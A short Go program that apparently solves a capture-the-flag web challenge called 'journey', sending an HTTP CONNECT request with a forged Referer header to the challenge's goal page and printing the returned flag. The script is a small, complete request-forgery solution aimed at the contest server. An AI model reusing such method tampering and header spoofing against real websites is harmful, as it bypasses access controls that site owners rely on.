package main

import (
	"context"
	"fmt"
	"io"
	"log"
	"net/http"
	"time"
)

const TARGET_URL = "https://tsukuctf.sechack365.com/problems/journey/goal"

func main() {
	ctx := context.Background()
	ctx, cancel := context.WithTimeout(ctx, 10*time.Second)
	defer cancel()

	// Create request
	req, err := http.NewRequestWithContext(ctx, http.MethodConnect, TARGET_URL, nil)
	if err != nil {
		log.Printf("failed NewRequestWithContext: %s", err.Error())
		return
	}
	// Add Referer
	req.Header.Add("Referer", "http://example.com/problems/journey/railway/1")

	// Do Request
	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		log.Printf("failed Do: %s", err.Error())
		return
	}
	defer resp.Body.Close()

	// Read Flag
	body, err := io.ReadAll(resp.Body)
	fmt.Println(string(body))
}
